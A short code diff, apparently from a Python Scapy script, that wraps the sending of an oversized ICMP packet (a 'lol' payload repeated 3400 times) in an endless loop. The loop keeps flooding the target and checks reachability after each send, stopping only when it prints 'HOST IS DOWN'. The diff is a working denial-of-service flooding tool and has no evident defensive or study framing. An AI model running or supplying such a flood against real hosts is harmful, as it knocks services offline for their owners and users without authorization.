@@ -10,4 +10,11 @@ lol = Raw(b"lol"*3400)
 
 packet = ip / icmp / lol
 
-send(packet,loop=0,verbose=1)
+while True:
+	send(packet,loop=0,verbose=1)
+	print("\n### TESTING REACHABILITY ###\n")
+	response = sr1(packet, timeout=3)
+	#response.summary()
+	if response == None:
+		print("\nNO RESPONSE. HOST IS DOWN\n")
+		break
